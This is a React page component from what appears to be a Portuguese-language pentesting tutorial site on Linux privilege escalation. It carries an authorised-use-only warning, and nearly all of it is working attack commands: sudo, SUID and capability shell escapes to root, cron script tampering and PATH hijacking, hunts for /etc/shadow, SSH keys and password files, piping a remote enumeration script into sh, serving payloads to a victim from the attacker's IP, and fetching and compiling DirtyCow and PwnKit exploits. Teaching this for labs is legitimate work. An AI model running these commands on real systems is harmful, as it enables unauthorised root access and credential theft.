import { PageContainer } from "@/components/layout/PageContainer";
  import { AlertBox } from "@/components/ui/AlertBox";
  import { CodeBlock } from "@/components/ui/CodeBlock";

  export default function PrivescLinux() {
    return (
      <PageContainer
        title="Escalação de Privilégios — Linux"
        subtitle="Técnicas para escalar de usuário comum para root após comprometer um sistema Linux."
        difficulty="avancado"
        timeToRead="20 min"
      >
        <AlertBox type="danger" title="Uso exclusivo em sistemas autorizados">
          Escalação de privilégios não autorizada é crime federal. Use apenas em labs, CTFs e
          sistemas que você tem permissão explícita para testar.
        </AlertBox>

        <h2>Enumeração Inicial (o mais importante!)</h2>
        <CodeBlock language="bash" code={'# Usuário atual e grupos\nid\nwhoami\ngroups\n\n# Sistema operacional e kernel\nuname -a\ncat /etc/os-release\ncat /proc/version\n\n# Usuários do sistema\ncat /etc/passwd\ncat /etc/shadow  # se tiver permissão\n\n# Arquivos SUID\nfind / -perm -u=s -type f 2>/dev/null\n\n# Arquivos SGID\nfind / -perm -g=s -type f 2>/dev/null\n\n# Capabilities\ngetcap -r / 2>/dev/null\n\n# Sudo sem senha\nsudo -l\n\n# Cronjobs\ncat /etc/crontab\ncrontab -l\nls -la /etc/cron*\ncat /etc/cron.d/*\n\n# Processos rodando como root\nps aux | grep root\n\n# Serviços ativos\nsystemctl list-units --type=service --state=running'} />

        <h2>SUDO — Abuso de Permissões</h2>
        <CodeBlock language="bash" code={'# Verificar permissões sudo\nsudo -l\n\n# Exemplos de escalação via sudo:\n# Se: (ALL) NOPASSWD: /usr/bin/vim\nsudo vim -c \':!/bin/bash\'\n\n# Se: (ALL) NOPASSWD: /usr/bin/find\nsudo find / -exec /bin/bash -p \\;\n\n# Se: (ALL) NOPASSWD: /usr/bin/python3\nsudo python3 -c \'import os; os.execl("/bin/bash", "bash", "-p")\'\n\n# Se: (ALL) NOPASSWD: /usr/bin/awk\nsudo awk \'BEGIN {system("/bin/bash")}\'\n\n# Consulte GTFOBins para mais técnicas:\n# https://gtfobins.github.io/'} />

        <h2>SUID — Binários com Bit SUID</h2>
        <CodeBlock language="bash" code={'# Encontrar binários SUID\nfind / -perm -u=s -type f 2>/dev/null\n\n# Explorar binários SUID comuns:\n\n# bash com SUID\n/bin/bash -p  # abre shell como root\n\n# cp com SUID — copiar /etc/shadow\n/bin/cp /etc/shadow /tmp/shadow.bak\n\n# vim com SUID\n/usr/bin/vim\n# dentro do vim: :shell  ou  :!/bin/bash\n\n# find com SUID\n/usr/bin/find . -exec /bin/bash -p \\;\n\n# python com SUID\n/usr/bin/python3 -c \'import os; os.setuid(0); os.system("/bin/bash")\'\n\n# nmap com SUID (versão antiga)\n/usr/bin/nmap --interactive\n# nmap> !sh'} />

        <h2>Capabilities do Kernel</h2>
        <CodeBlock language="bash" code={'# Listar capabilities\ngetcap -r / 2>/dev/null\n\n# Explorar cap_setuid+ep:\n# Se python3 tiver cap_setuid:\n/usr/bin/python3 -c \'import os; os.setuid(0); os.system("/bin/bash")\'\n\n# Se perl tiver cap_setuid:\n/usr/bin/perl -e \'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";\'\n\n# Se node tiver cap_setuid:\n/usr/bin/node -e \'process.setuid(0); require("child_process").spawn("/bin/bash", {stdio: [0,1,2]})\'\n\n# cap_dac_read_search — ler qualquer arquivo\n/usr/sbin/tarS -cvf /tmp/etc.tar /etc/shadow'} />

        <h2>Cronjobs — Scripts com Permissões Fracas</h2>
        <CodeBlock language="bash" code={'# Verificar scripts executados como root no cron\ncat /etc/crontab\nls -la /etc/cron.d/\n\n# Se um script for writable pelo usuário atual:\nls -la /opt/backup.sh\necho "chmod +s /bin/bash" >> /opt/backup.sh\n# Aguardar o cron executar, depois:\n/bin/bash -p\n\n# PATH hijacking via cron\n# Se o crontab tem PATH=/home/usuario:/usr/bin\n# e executa: backup.sh (sem caminho absoluto)\necho \'/bin/bash -p\' > /home/usuario/backup.sh\nchmod +x /home/usuario/backup.sh'} />

        <h2>Senhas em Arquivos e Histórico</h2>
        <CodeBlock language="bash" code={'# Histórico de comandos\ncat ~/.bash_history\ncat ~/.zsh_history\n\n# Arquivos de config com senhas\nfind / -name "*.conf" -readable 2>/dev/null | xargs grep -l "password" 2>/dev/null\nfind / -name "*.env" -readable 2>/dev/null\nfind / -name "wp-config.php" 2>/dev/null\n\n# Banco de dados de senhas\nfind / -name "*.db" -o -name "*.sqlite" 2>/dev/null\n\n# SSH keys\nfind / -name "id_rsa" 2>/dev/null\nfind / -name "*.pem" 2>/dev/null\nls ~/.ssh/'} />

        <h2>LinPEAS — Automatizar Enumeração</h2>
        <CodeBlock language="bash" code={'# Download e execução\ncurl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh\n\n# Via wget\nwget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh\nchmod +x linpeas.sh\n./linpeas.sh\n\n# Salvar output com cores\n./linpeas.sh | tee -a /tmp/linpeas_output.txt\n\n# Transferir para máquina alvo (do atacante)\npython3 -m http.server 8080\n# (na vítima)\nwget http://SEU_IP:8080/linpeas.sh'} />

        <h2>Exploits de Kernel</h2>
        <CodeBlock language="bash" code={'# Verificar versão do kernel\nuname -r\n\n# Buscar exploits\nsearchsploit linux kernel $(uname -r)\n\n# Exploits famosos:\n# CVE-2021-4034 — PwnKit (pkexec)\n# CVE-2021-3156 — Sudo Heap Overflow (Baron Samedit)\n# CVE-2016-5195 — DirtyCow\n# CVE-2022-0847 — Dirty Pipe\n\n# DirtyCow (muito antigo, kernels < 4.8.3)\nwget https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c\ngcc -pthread dirty.c -o dirty -lcrypt\n./dirty\n\n# PwnKit (2022, CVE-2021-4034)\ngit clone https://github.com/berdav/CVE-2021-4034\ncd CVE-2021-4034 && make && ./cve-2021-4034'} />

        <AlertBox type="success" title="Dica de workflow completo">
          1. Obter shell → 2. Rodar LinPEAS → 3. Analisar SUID/SUDO/Caps → 4. Verificar cronjobs e
          arquivos writable → 5. Buscar senhas em configs → 6. Tentar exploits de kernel como último recurso.
        </AlertBox>
      </PageContainer>
    );
  }
  